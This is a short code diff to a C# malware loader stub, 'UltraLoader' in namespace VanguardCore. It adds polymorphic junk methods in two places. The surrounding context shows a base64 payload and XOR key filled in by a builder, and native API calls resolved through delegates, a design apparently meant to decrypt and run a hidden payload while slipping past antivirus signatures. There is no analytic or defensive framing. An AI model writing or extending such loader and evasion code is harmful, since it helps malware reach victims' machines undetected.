@@ -16,6 +16,12 @@ namespace VanguardCore
     /// </summary>
     public static class UltraLoader
     {
+        // [POLY_JUNK]
+        private static void _vanguard_5648f42f() {
+            int val = 17876;
+            if (val > 50000) Console.WriteLine("Hash:" + 17876);
+        }
+
         #region Конфигурация (заполняется билдером)
         private static readonly string PAYLOAD_B64 = "{{PAYLOAD_B64}}";
         private static readonly string XOR_KEY = "{{XOR_KEY}}";
@@ -102,6 +108,12 @@ namespace VanguardCore
         #region Native Imports (через делегаты)
         private static class NativeApi
         {
+        // [POLY_JUNK]
+        private static void _vanguard_5648f42f() {
+            int val = 17876;
+            if (val > 50000) Console.WriteLine("Hash:" + 17876);
+        }
+
             private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
             private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();
 
